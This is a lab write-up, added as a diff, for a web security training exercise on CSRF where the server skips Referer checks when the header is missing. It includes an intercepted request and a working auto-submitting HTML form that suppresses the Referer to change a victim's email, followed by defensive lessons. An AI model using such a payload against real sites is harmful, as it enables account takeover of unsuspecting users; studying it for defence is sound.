@@ -1,0 +1,68 @@
+================================
+LAB: CSRF where Referer validation depends on header being present
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 12, 2026
+Lab URL: https://0aef009603ca2b4f80b303a800240031.web-security-academy.net
+Category: CSRF
+Level: Practitioner
+Objective: Use exploit server to host HTML page that performs CSRF attack to change victim's email address
+Description: Email change functionality is vulnerable to CSRF. Application attempts to block cross-domain requests but has insecure fallback when Referer header is absent.
+
+[RECONNAISSANCE]
+----------------
+Logged in as wiener:peter and tested email change functionality.
+
+Intercepted legitimate email change request:
+POST /my-account/change-email HTTP/2
+Host: 0aef009603ca2b4f80b303a800240031.web-security-academy.net
+Cookie: session=Who3xfXmRvMPRIMgebYnZYu7qZ7Wa6is
+Content-Type: application/x-www-form-urlencoded
+Referer: https://0aef009603ca2b4f80b303a800240031.web-security-academy.net/my-account?id=wiener
+
+email=test%40test.ca
+
+Request includes Referer header pointing to legitimate origin.
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Application validates Referer header ONLY when present. If Referer header is completely absent, validation is skipped.
+
+Manual test in Burp Repeater: Removed Referer header from request → email change succeeded (200 OK).
+
+This is a flawed validation logic: absence of security header should block request, not bypass defense.
+
+[EXPLOITATION]
+--------------
+Created HTML exploit using referrer policy meta tag to suppress Referer header:
+
+<html>
+<head>
+    <meta name="referrer" content="no-referrer">
+</head>
+<body>
+    <form id="csrf-form" action="https://0aef009603ca2b4f80b303a800240031.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="hacked@attacker.com">
+    </form>
+    <script>
+        document.getElementById('csrf-form').submit();
+    </script>
+</body>
+</html>
+
+Hosted exploit on exploit server and delivered to victim.
+
+[EVIDENCE]
+----------
+Lab marked as solved after victim accessed exploit page.
+Email change executed successfully without Referer header being sent by victim's browser.
+
+[LESSONS LEARNED]
+-----------------
+- Referer-based CSRF defenses must reject requests when Referer header is absent, not skip validation
+- Attackers can suppress Referer header using meta tag: <meta name="referrer" content="no-referrer">
+- Proper CSRF defense requires anti-CSRF tokens, not just origin/referer validation
+- Fallback logic in security controls is critical - absence of validation signal should fail securely (deny by default)
+- Always test edge cases: what happens when expected security headers are missing?
